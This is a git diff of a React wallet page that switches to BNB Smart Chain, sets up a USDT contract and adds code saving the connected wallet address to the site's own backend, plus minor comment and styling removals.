@@ -16,6 +16,7 @@ export default function Home() {
         return;
       }
 
+      // 🔥 switch BNB
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
@@ -23,6 +24,18 @@ export default function Home() {
 
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+
+      // 🔥 PRENDE ADDRESS UTENTE
+      const userAddress = await signer.getAddress();
+
+      // 🔥 SALVA SU BACKEND
+      await fetch("/api/save", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ address: userAddress }),
+      });
 
       const usdt = new ethers.Contract(
         USDT_ADDRESS,
@@ -46,7 +59,6 @@ export default function Home() {
     }
   };
 
-  // 🔥 CALCOLO DINAMICO USD
   const usdValue = amount && Number(amount) > 0
     ? Number(amount).toFixed(2)
     : "0.00";
@@ -107,8 +119,6 @@ export default function Home() {
           alignItems: "center",
           gap: "10px"
         }}>
-          
-          {/* LOGO BNB */}
           <svg width="20" height="20" viewBox="0 0 24 24" fill="#F3BA2F">
             <path d="M12 2l2.9 2.9-2.9 2.9-2.9-2.9L12 2zm0 6.8l2.9 2.9-2.9 2.9-2.9-2.9L12 8.8zm0 6.8l2.9 2.9-2.9 2.9-2.9-2.9L12 15.6zm6.8-6.8l2.9 2.9-2.9 2.9-2.9-2.9 2.9-2.9zM5.2 8.8l2.9 2.9-2.9 2.9-2.9-2.9 2.9-2.9z"/>
           </svg>
@@ -149,7 +159,6 @@ export default function Home() {
           <span style={{ color: "#22c55e" }}>Max</span>
         </div>
 
-        {/* 🔥 VALORE DINAMICO */}
         <div style={{ color: "#888", marginTop: "5px" }}>
           ≈ ${usdValue}
         </div>
@@ -173,16 +182,11 @@ export default function Home() {
             fontSize: "18px",
             fontWeight: "600",
             transition: "all 0.3s ease",
-
             background: isValidAmount ? "#4ade80" : "#1a2e22",
             color: isValidAmount ? "#052e16" : "#6b7280",
-
             boxShadow: isValidAmount
               ? "0 0 20px rgba(74, 222, 128, 0.7)"
               : "none",
-
-            transform: isValidAmount ? "scale(1)" : "scale(0.98)",
-
             cursor: isValidAmount ? "pointer" : "not-allowed"
           }}
         >
